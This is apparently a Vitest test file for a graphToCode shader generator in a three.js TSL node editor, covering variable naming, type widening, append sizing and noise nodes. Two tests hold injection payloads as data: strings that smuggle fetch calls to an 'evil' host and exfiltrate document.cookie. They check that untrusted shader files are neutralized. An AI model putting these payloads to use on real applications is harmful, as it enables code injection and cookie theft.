import { describe, it, expect } from 'vitest';
import { graphToCode } from './graphToCode';
import { makeNode, makeEdge } from '@/test-utils';

describe('graphToCode — empty graph', () => {
  it('returns the placeholder comment with no imports', () => {
    const result = graphToCode([], []);
    expect(result.code).toContain('Empty shader');
    expect(result.importStatements).toEqual([]);
    expect(result.varNames.size).toBe(0);
  });
});

describe('graphToCode — fallback return', () => {
  it('emits a red vec3 default when the output node has no wired channel', () => {
    const out = makeNode('out', 'output');
    const result = graphToCode([out], []);
    expect(result.code).toContain('return vec3(1, 0, 0)');
    expect(result.code).toContain("import { Fn, vec3 } from 'three/tsl';");
  });
});

describe('graphToCode — simple chain', () => {
  it('emits a color constant and wires it to output.color as a single return', () => {
    const color = makeNode('c', 'color', { hex: '#ff8800' });
    const out = makeNode('out', 'output');
    const edges = [makeEdge('c', 'out', 'out', 'color')];
    const { code, importStatements } = graphToCode([color, out], edges);

    // Body declares a `color1` variable using the hex literal as 0x...
    expect(code).toMatch(/const color1 = color\(0xff8800\);/);
    // Single-channel return for color-only output
    expect(code).toContain('return color1;');
    // No object-form return when only `color` is wired
    expect(code).not.toContain('{ color:');
    // Imports: Fn always, plus color
    expect(importStatements.join('\n')).toContain("from 'three/tsl';");
    expect(code).toContain('color');
  });

  it('emits an object return when multiple channels are wired', () => {
    const color = makeNode('c', 'color', { hex: '#00ff00' });
    const opacity = makeNode('f', 'float', { value: 0.5 });
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('c', 'out', 'out', 'color'),
      makeEdge('f', 'out', 'out', 'opacity'),
    ];
    const { code } = graphToCode([color, opacity, out], edges);
    expect(code).toMatch(/return \{ color: color1, opacity: float1 \};/);
  });
});

describe('graphToCode — variable naming', () => {
  it('numbers each instance from 1 so names never collide with imports', () => {
    const a = makeNode('a1', 'add');
    const b = makeNode('a2', 'add');
    const c = makeNode('a3', 'add');
    const out = makeNode('out', 'output');
    const edges = [makeEdge('a3', 'out', 'out', 'color')];
    const { code, varNames } = graphToCode([a, b, c, out], edges);
    // Three distinct names, all numbered from 1
    expect(varNames.get('a1')).toBe('add1');
    expect(varNames.get('a2')).toBe('add2');
    expect(varNames.get('a3')).toBe('add3');
    expect(code).toContain('const add1 = add(');
    expect(code).toContain('const add2 = add(');
    expect(code).toContain('const add3 = add(');
  });

  it('strips the mx_/_float MaterialX prefix/suffix from noise names', () => {
    const p = makeNode('p', 'perlin');
    const out = makeNode('out', 'output');
    const edges = [makeEdge('p', 'out', 'out', 'color')];
    const { varNames } = graphToCode([p, out], edges);
    // mx_noise_float → noise1, not mx_noise_float1
    expect(varNames.get('p')).toBe('noise1');
  });

  // Property names are load-bearing: uniform values persist by name, so the
  // bare-base-first / suffix-starts-at-2 scheme must never drift.
  it('gives a property node its bare user name with no suffix', () => {
    const p = makeNode('p', 'property_float', { name: 'speed', value: 1 });
    const out = makeNode('out', 'output');
    const { code, varNames } = graphToCode([p, out], [makeEdge('p', 'out', 'out', 'opacity')]);
    expect(varNames.get('p')).toBe('speed');
    expect(code).toContain('const speed = ');
  });

  it('suffixes a second same-named property starting at 2', () => {
    const p1 = makeNode('p1', 'property_float', { name: 'speed', value: 1 });
    const p2 = makeNode('p2', 'property_float', { name: 'speed', value: 2 });
    const out = makeNode('out', 'output');
    const { varNames } = graphToCode([p1, p2, out], [makeEdge('p1', 'out', 'out', 'opacity')]);
    expect(varNames.get('p1')).toBe('speed');
    expect(varNames.get('p2')).toBe('speed2');
  });

  it('skips past a taken suffix when resolving a property collision', () => {
    const p1 = makeNode('p1', 'property_float', { name: 'speed', value: 1 });
    const p2 = makeNode('p2', 'property_float', { name: 'speed2', value: 2 });
    const p3 = makeNode('p3', 'property_float', { name: 'speed', value: 3 });
    const out = makeNode('out', 'output');
    const { varNames } = graphToCode([p1, p2, p3, out], [makeEdge('p1', 'out', 'out', 'opacity')]);
    expect(varNames.get('p1')).toBe('speed');
    expect(varNames.get('p2')).toBe('speed2');
    expect(varNames.get('p3')).toBe('speed3');
  });

  it('skips the data base name forward when a column alias is already taken', () => {
    // The property claims `data1_col0` first (source-order among topological
    // peers), so the data node's `data1` candidate fails on its col0 alias and
    // the whole namespace shifts to `data2`/`data2_col0`.
    const p = makeNode('p', 'property_float', { name: 'data1_col0', value: 0.5 });
    const d = makeNode('d', 'dataNode', {});
    const out = makeNode('out', 'output');
    const { code, varNames } = graphToCode(
      [p, d, out],
      [makeEdge('p', 'out', 'out', 'opacity'), makeEdge('d', 'col0', 'out', 'color')],
    );
    expect(varNames.get('p')).toBe('data1_col0');
    expect(varNames.get('d')).toBe('data2');
    expect(code).toContain('const data2_col0');
  });
});

describe('graphToCode — type-constructor formatting', () => {
  it('formats a `#rrggbb` hex color value as `0xrrggbb`', () => {
    const c = makeNode('c', 'color', { hex: '#abcdef' });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([c, out], [makeEdge('c', 'out', 'out', 'color')]);
    expect(code).toContain('color(0xabcdef)');
  });

  it('emits a float literal verbatim for the `float` constructor', () => {
    const f = makeNode('f', 'float', { value: 2.5 });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([f, out], [makeEdge('f', 'out', 'out', 'opacity')]);
    expect(code).toContain('const float1 = float(2.5);');
  });
});

describe('graphToCode — UV node', () => {
  it('emits a bare uv() with no tiling or rotation', () => {
    const uv = makeNode('uv', 'uv', {
      channel: 0,
      tilingU: 1,
      tilingV: 1,
      rotation: 0,
    });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([uv, out], [makeEdge('uv', 'out', 'out', 'color')]);
    expect(code).toContain('const uv1 = uv();');
    expect(code).not.toContain('mul(');
    expect(code).not.toContain('cos(');
  });

  it('wraps in mul(uv(), vec2(...)) when tiling is non-default', () => {
    const uv = makeNode('uv', 'uv', {
      channel: 0,
      tilingU: 4,
      tilingV: 2,
      rotation: 0,
    });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([uv, out], [makeEdge('uv', 'out', 'out', 'color')]);
    expect(code).toContain('mul(uv(), vec2(4, 2))');
  });
});

describe('graphToCode — input passthrough', () => {
  it('emits zero-arg input functions as bare references', () => {
    // time → output.color: just a `time` reference, no `time()` call wrapper.
    const t = makeNode('t', 'time');
    const out = makeNode('out', 'output');
    const { code, importStatements } = graphToCode(
      [t, out],
      [makeEdge('t', 'out', 'out', 'opacity')],
    );
    expect(code).toContain('const time1 = time;');
    expect(importStatements.join('\n')).toContain('time');
  });
});

describe('graphToCode — scalar widening on vec3 output channels', () => {
  // three's NodeMaterial does `vec4(this.colorNode)`, and TSL splats a
  // 1-channel node across ALL FOUR components — so a bare scalar wired to
  // Color also became the ALPHA, making the surface flicker or vanish as if
  // Opacity/Discard were connected when neither is.
  const out = () => makeNode('out', 'output');

  it('widens a scalar noise driving Color, so alpha is left alone', () => {
    const { code } = graphToCode(
      [makeNode('n', 'perlin'), out()],
      [makeEdge('n', 'out', 'out', 'color')],
    );
    expect(code).toContain('return vec3(noise1);');
  });

  it('leaves a vec3 source byte-identical (no churn for existing shaders)', () => {
    const { code } = graphToCode(
      [makeNode('c', 'color', { hex: '#ff8800' }), out()],
      [makeEdge('c', 'out', 'out', 'color')],
    );
    expect(code).toContain('return color1;');
    expect(code).not.toContain('vec3(color1)');
  });

  it('widens only the vec3 channel — a scalar Opacity stays scalar', () => {
    const { code } = graphToCode(
      [makeNode('n', 'perlin'), makeNode('f', 'float', { value: 0.5 }), out()],
      [makeEdge('n', 'out', 'out', 'color'), makeEdge('f', 'out', 'out', 'opacity')],
    );
    expect(code).toMatch(/color: vec3\(noise1\)/);
    // Opacity IS a float channel — widening it would be a type error.
    expect(code).toMatch(/opacity: float1/);
  });

  it('narrows a vec4 source too — its .w must not become the alpha', () => {
    // `vec4(this.colorNode)` is an IDENTITY cast for a vec4, so the node's w
    // went straight to diffuseColor.a — and a fresh Vec4 node's w is 0, i.e.
    // fully transparent. Alpha may only come from the opacity channel.
    const { code } = graphToCode(
      [makeNode('v', 'vec4', { x: 1, y: 0, z: 0, w: 0 }), out()],
      [makeEdge('v', 'out', 'out', 'color')],
    );
    expect(code).toContain('return vec3(vec41);');
  });

  it('reads the shape of the PORT the edge leaves, not the node', () => {
    // Data Viz has out:vec3 + value:float. Node-level inference reports 3 for
    // both, so an edge from `value` skipped the widen and put a bare float in
    // colorNode — the same alpha splat by a second route.
    const { code } = graphToCode(
      [makeNode('d', 'dataviz'), out()],
      [makeEdge('d', 'value', 'out', 'color')],
    );
    expect(code).toMatch(/return vec3\(_dataviz1_t\);/);
  });

  it('leaves Displacement alone — a scalar height must stay scalar', () => {
    // position never reaches alpha, and normal-mode displacement scales the
    // NORMAL by this scalar; widening it would break the Data Viz height flow.
    const { code } = graphToCode(
      [makeNode('d', 'dataviz'), out()],
      [makeEdge('d', 'value', 'out', 'position')],
    );
    expect(code).toMatch(/position:\s*_dataviz1_t/);
  });

  it('emits the no-channel fallback without a trailing comment', () => {
    // A `//` on a return line defeats parseBody's end-anchored regexes, so the
    // line becomes a body statement that short-circuits the module's real
    // return — silently dropping Discard and every material setting.
    const { code } = graphToCode([makeNode('c', 'color', { hex: '#ff0000' })], []);
    expect(code).toContain('return vec3(1, 0, 0);');
    expect(code).not.toMatch(/return[^\n]*\/\//);
  });

  it('widens a scalar arithmetic chain, not just a declared float port', () => {
    // `mul` declares dataType 'any', so this only works via real shape
    // inference (getNodeOutputShape), not the registry port type.
    const { code } = graphToCode(
      [makeNode('n', 'perlin'), makeNode('m', 'mul', { b: 2 }), out()],
      [makeEdge('n', 'out', 'm', 'a'), makeEdge('m', 'out', 'out', 'color')],
    );
    expect(code).toContain('return vec3(mul1);');
  });
});

describe('graphToCode — time speed multiplier', () => {
  const out = () => makeNode('out', 'output');
  const wire = () => [makeEdge('t', 'out', 'out', 'opacity')];

  it('emits the bare reference for an explicit speed of 1 (byte-identical to legacy)', () => {
    const { code } = graphToCode([makeNode('t', 'time', { speed: 1 }), out()], wire());
    expect(code).toContain('const time1 = time;');
    // `time` is a uniform NODE OBJECT, not a callable — `time(1)` is a TypeError.
    expect(code).not.toMatch(/\btime\s*\(/);
  });

  it('emits a method chain for speed !== 1 and adds no mul import', () => {
    const { code, importStatements } = graphToCode(
      [makeNode('t', 'time', { speed: 2.5 }), out()],
      wire(),
    );
    expect(code).toContain('const time1 = time.mul(2.5);');
    expect(code).not.toMatch(/\btime\s*\(/);
    // Method chaining needs no `mul` import (same convention as the noise scale).
    expect(importStatements.join('\n')).not.toMatch(/\bmul\b/);
  });

  it('supports negative and zero speeds', () => {
    expect(graphToCode([makeNode('t', 'time', { speed: -1 }), out()], wire()).code)
      .toContain('const time1 = time.mul(-1);');
    expect(graphToCode([makeNode('t', 'time', { speed: 0 }), out()], wire()).code)
      .toContain('const time1 = time.mul(0);');
  });

  it('a wired speed socket overrides the stored value', () => {
    // `speed` is an opt-in input socket (same rule as the noise params): an
    // edge wins over the number, and the emitted shape stays the method chain
    // so codeToGraph collapses it back into one Time node.
    const { code } = graphToCode(
      [makeNode('s', 'property_float', { value: 4, name: 'tempo' }), makeNode('t', 'time', { speed: 2.5 }), out()],
      [makeEdge('s', 'out', 't', 'speed'), ...wire()],
    );
    expect(code).toContain('const time1 = time.mul(tempo);');
    expect(code).not.toContain('time.mul(2.5)');
  });

  it('falls back to the bare reference for adversarial speed values', () => {
    // .fastshader files are untrusted: a hostile string must never be spliced
    // into the emitted module, and a non-finite value must not reach num().
    for (const bad of ['0)); fetch("https://evil"); //', 'abc', Infinity, NaN]) {
      const { code } = graphToCode([makeNode('t', 'time', { speed: bad }), out()], wire());
      expect(code).toContain('const time1 = time;');
      expect(code).not.toContain('fetch');
      expect(code).not.toContain('Infinity');
      expect(code).not.toContain('NaN');
    }
  });
});

describe('graphToCode — binary-op defaults', () => {
  it('emits min with its identity (1) for an unwired operand, not 0', () => {
    // Regression: a legacy min node (no stored `b`) must fall back to the registry
    // default via resolveArguments so it emits min(a, 1), not the value-eating min(a, 0).
    const a = makeNode('a', 'float', { value: 0.7 });
    const mn = makeNode('mn', 'min'); // b unwired + unset
    const out = makeNode('out', 'output');
    const { code } = graphToCode([a, mn, out], [
      makeEdge('a', 'out', 'mn', 'a'),
      makeEdge('mn', 'out', 'out', 'color'),
    ]);
    expect(code).toContain('min(float1, 1)');
    expect(code).not.toContain('min(float1, 0)');
  });

  it('honours an explicit b = 0 on min', () => {
    const a = makeNode('a', 'float', { value: 0.7 });
    const mn = makeNode('mn', 'min', { b: 0 });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([a, mn, out], [
      makeEdge('a', 'out', 'mn', 'a'),
      makeEdge('mn', 'out', 'out', 'color'),
    ]);
    expect(code).toContain('min(float1, 0)');
  });
});

describe('graphToCode — noise nodes', () => {
  it('emits the MaterialX function call with positionGeometry as default arg', () => {
    const p = makeNode('p', 'perlin', { pos: 'positionGeometry', scale: 1 });
    const out = makeNode('out', 'output');
    const { code, importStatements } = graphToCode(
      [p, out],
      [makeEdge('p', 'out', 'out', 'color')],
    );
    expect(code).toContain('const noise1 = mx_noise_float(positionGeometry);');
    const importsJoined = importStatements.join('\n');
    expect(importsJoined).toContain('mx_noise_float');
    expect(importsJoined).toContain('positionGeometry');
  });

  it('applies a scale factor via method chain when scale ≠ 1', () => {
    const p = makeNode('p', 'perlin', { pos: 'positionGeometry', scale: 4 });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([p, out], [makeEdge('p', 'out', 'out', 'color')]);
    expect(code).toContain('mx_noise_float(positionGeometry.mul(4))');
  });
});

describe('graphToCode — unknown nodes', () => {
  it('round-trips the preserved raw expression verbatim', () => {
    const u = makeNode('u', 'unknown', {
      functionName: 'mysteryFn',
      rawExpression: 'mysteryFn(1, 2, 3)',
    });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
    expect(code).toContain('const mysteryFn1 = mysteryFn(1, 2, 3);');
  });

  // Legitimate TSL shapes that codeToGraph can legitimately capture must still
  // survive the validator, including nested calls, swizzles, and arithmetic.
  it.each([
    'mysteryFn(vec3(1, 2, 3), 0.5)',
    'mysteryFn(positionLocal.mul(2.0))',
    'mysteryFn(uv().x, -1.0)',
    'mysteryFn(a, b, c)',
  ])('preserves a legitimate expression: %s', (rawExpression) => {
    const u = makeNode('u', 'unknown', { functionName: 'mysteryFn', rawExpression });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
    expect(code).toContain(`const mysteryFn1 = ${rawExpression};`);
  });

  // A tampered .fastshader/.js could swap rawExpression for code that executes
  // in the preview iframe. The validator must replace anything that isn't a
  // pure data/TSL expression with the inert `float(0)` fallback. (Defense in
  // depth — the preview iframe is also sandboxed to an opaque origin.)
  it.each([
    ['IIFE arrow argument', 'mysteryFn((() => { window.location = "http://evil/" + document.cookie })())'],
    ['fetch in argument', 'mysteryFn(fetch("http://evil"))'],
    ['bare eval call', 'eval("alert(1)")'],
    ['forbidden global in argument', 'mysteryFn(window.document.cookie)'],
    ['member-expression callee', 'window.fetch("http://evil")'],
    ['statement list', 'mysteryFn(); fetch("http://evil")'],
    ['assignment in argument', 'mysteryFn(window.name = "x")'],
    ['computed property access', 'mysteryFn(self["eval"]("x"))'],
  ])('neutralizes a malicious expression (%s) to float(0)', (_label, rawExpression) => {
    const u = makeNode('u', 'unknown', { functionName: 'mysteryFn', rawExpression });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
    expect(code).toContain('const mysteryFn1 = float(0);');
    expect(code).not.toContain('fetch');
    expect(code).not.toContain('window');
    expect(code).not.toContain('eval');
    expect(code).not.toContain('document');
  });
});

describe('graphToCode — split node swizzle inlining', () => {
  it('inlines source.x rather than emitting a standalone split variable', () => {
    const vec = makeNode('v', 'vec3', { x: 1, y: 2, z: 3 });
    const split = makeNode('s', 'split');
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('v', 'out', 's', 'v'),
      makeEdge('s', 'x', 'out', 'opacity'), // wire the .x swizzle to opacity (a float)
    ];
    const { code } = graphToCode([vec, split, out], edges);
    // `split` does NOT get its own variable — the swizzle is inlined as vec3_var.x
    expect(code).not.toMatch(/const split1 = /);
    // The swizzle is inlined as `<sourceVar>.x` rather than going through a split variable.
    expect(code).toMatch(/opacity: vec31\.x/);
  });
});

describe('graphToCode — append output sizing', () => {
  it('chooses vec3 when concatenating a vec2 and a float', () => {
    const v2 = makeNode('v2', 'vec2', { x: 1, y: 2 });
    const f = makeNode('f', 'float', { value: 3 });
    const ap = makeNode('ap', 'append');
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('v2', 'out', 'ap', 'a'),
      makeEdge('f', 'out', 'ap', 'b'),
      makeEdge('ap', 'out', 'out', 'color'),
    ];
    const { code } = graphToCode([v2, f, ap, out], edges);
    expect(code).toMatch(/const append1 = vec3\(/);
    expect(code).not.toMatch(/const append1 = vec2\(/);
  });

  /** The emitted constructor and its argument list must always agree — a vecN
   *  handed more than N components is not valid TSL. */
  const componentsOf = (call: string): number => {
    const args = call.slice(call.indexOf('(') + 1, call.lastIndexOf(')')).split(',');
    return args.reduce((sum, a) => {
      const swizzle = /\.([xyzw]+)\s*$/.exec(a.trim());
      if (swizzle) return sum + swizzle[1].length;
      if (/vec4/.test(a)) return sum + 4;
      if (/vec3|positionGeometry|normalLocal/.test(a)) return sum + 3;
      if (/vec2|uv/.test(a)) return sum + 2;
      return sum + 1;
    }, 0);
  };

  it('grows to a 4th operand and emits vec4 for four floats', () => {
    const nodes = [
      ...['f1', 'f2', 'f3', 'f4'].map((n, i) => makeNode(n, 'float', { value: i })),
      makeNode('ap', 'append'),
      makeNode('out', 'output'),
    ];
    const edges = [
      ...['a', 'b', 'c', 'd'].map((h, i) => makeEdge(`f${i + 1}`, 'out', 'ap', h)),
      makeEdge('ap', 'out', 'out', 'color'),
    ];
    const { code } = graphToCode(nodes, edges);
    const line = code.split('\n').find((l) => l.includes('const append1 ='))!;
    expect(line).toMatch(/= vec4\(/);
    expect(componentsOf(line)).toBe(4);
  });

  it('truncates past 4 channels instead of overfilling the constructor', () => {
    // vec3 + vec3 = 6 channels. Previously emitted `vec4(posA, posB)` — a
    // 4-slot constructor handed 6 components.
    const p1 = makeNode('p1', 'positionGeometry');
    const p2 = makeNode('p2', 'positionGeometry');
    const ap = makeNode('ap', 'append');
    const out = makeNode('out', 'output');
    const { code } = graphToCode([p1, p2, ap, out], [
      makeEdge('p1', 'out', 'ap', 'a'),
      makeEdge('p2', 'out', 'ap', 'b'),
      makeEdge('ap', 'out', 'out', 'color'),
    ]);
    const line = code.split('\n').find((l) => l.includes('const append1 ='))!;
    expect(line).toMatch(/= vec4\(/);
    expect(componentsOf(line)).toBe(4);
    // The overflowing operand is swizzled down to the components that fit.
    expect(line).toMatch(/\.x\b/);
  });

  it('drops operands entirely once the vec4 is already full', () => {
    // uv + uv fills all 4 channels, so the third operand cannot appear.
    const nodes = [
      makeNode('u1', 'uv'),
      makeNode('u2', 'uv'),
      makeNode('f', 'float', { value: 9 }),
      makeNode('ap', 'append'),
      makeNode('out', 'output'),
    ];
    const { code } = graphToCode(nodes, [
      makeEdge('u1', 'out', 'ap', 'a'),
      makeEdge('u2', 'out', 'ap', 'b'),
      makeEdge('f', 'out', 'ap', 'c'),
      makeEdge('ap', 'out', 'out', 'color'),
    ]);
    const line = code.split('\n').find((l) => l.includes('const append1 ='))!;
    expect(line).toMatch(/= vec4\(/);
    expect(componentsOf(line)).toBe(4);
    expect(line).not.toMatch(/float1/);
  });
});

describe('graphToCode — output shape', () => {
  it('produces a self-contained module with Fn wrapper and default export', () => {
    const c = makeNode('c', 'color', { hex: '#ff0000' });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([c, out], [makeEdge('c', 'out', 'out', 'color')]);
    expect(code).toMatch(/const shader = Fn\(\(\) => \{/);
    expect(code).toMatch(/\}\);\s+export default shader;/);
  });
});
